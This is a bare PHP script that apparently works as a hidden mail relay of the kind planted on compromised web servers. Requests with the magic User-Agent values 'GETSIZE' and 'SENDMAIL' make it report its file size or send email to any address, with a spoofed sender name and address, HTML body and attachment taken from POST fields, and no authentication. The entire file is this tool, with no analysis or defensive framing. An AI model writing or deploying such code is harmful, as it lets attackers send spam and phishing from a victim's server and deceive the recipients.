<?php
ini_set('error_reporting',E_ALL);
ini_set('display_errors',1);
ini_set('display_startup_errors',1);
if (get_magic_quotes_gpc()){
    function stripslashes_gpc(&$value){$value=stripslashes($value);}
    array_walk_recursive($_GET,'stripslashes_gpc');
    array_walk_recursive($_POST,'stripslashes_gpc');
    array_walk_recursive($_COOKIE,'stripslashes_gpc');
    array_walk_recursive($_REQUEST,'stripslashes_gpc');
}
function mhe($s){return '=?UTF-8?B?'.base64_encode($s).'?=';}
function sendmail($email_to,$name_to,$email_from,$name_from,$subject,$body){
    $header = 'From: '.mhe($name_from).' <'.$email_from.'>'."\n";
    $header.= 'X-Mailer: PHP/'.phpversion()."\n";
    $header.= 'MIME-Version: 1.0'."\n";
    $header.= 'Content-Type: text/html; charset=UTF-8'."\n";
    return mail(mhe($name_to).' <'.$email_to.'>',mhe($subject),$body,$header);
}
function sendmail_attach($email_to,$name_to,$email_from,$name_from,$subject,$body,$attach_name,$attach_file){
    $file_size = filesize($attach_file);
    $file_open = fopen($attach_file,'r');
    $file_content = chunk_split(base64_encode(fread($file_open,$file_size)));
    fclose($file_open);
    $boundary = md5(uniqid(time()));
    $header = 'From: '.mhe($name_from).' <'.$email_from.'>'."\n";
    $header.= 'X-Mailer: PHP/'.phpversion()."\n";
    $header.= 'MIME-Version: 1.0'."\n";
    $header.= 'Content-Type: multipart/mixed; boundary="'.$boundary.'"'."\n\n";
    $message = '--'.$boundary."\n";
    $message.= 'Content-Type: text/html; charset=UTF-8'."\n";
    $message.= 'Content-Transfer-Encoding: 7bit'."\n\n";
    $message.= $body."\n\n";
    $message.= '--'.$boundary."\n";
    $message.= 'Content-Type: application/octet-stream; name="'.$attach_name.'"'."\n";
    $message.= 'Content-Transfer-Encoding: base64'."\n";
    $message.= 'Content-Disposition: attachment; filename="'.$attach_name.'"'."\n\n";
    $message.= $file_content."\n\n";
    $message.= '--'.$boundary.'--';
    return mail(mhe($name_to).' <'.$email_to.'>',mhe($subject),$message,$header);
}
if($_SERVER['HTTP_USER_AGENT']=='GETSIZE'){echo('{"status":"1","size":"'.filesize(__FILE__).'"}');}
if($_SERVER['HTTP_USER_AGENT']=='SENDMAIL'){
    $email_to = $_POST['email_to'];
    $name_to = $_POST['name_to'];
    $email_from = $_POST['email_from'];
    $name_from = $_POST['name_from'];
    $subject = $_POST['subject'];
    $body = $_POST['body'];
    if(isset($_FILES['attach_file']['tmp_name'])){
        $attach_name = $_POST['attach_name'];
        $attach_file = $_FILES['attach_file']['tmp_name'];
        $result = sendmail_attach($email_to,$name_to,$email_from,$name_from,$subject,$body,$attach_name,$attach_file);
    }else{$result = sendmail($email_to,$name_to,$email_from,$name_from,$subject,$body);}
    echo($result);
}
?>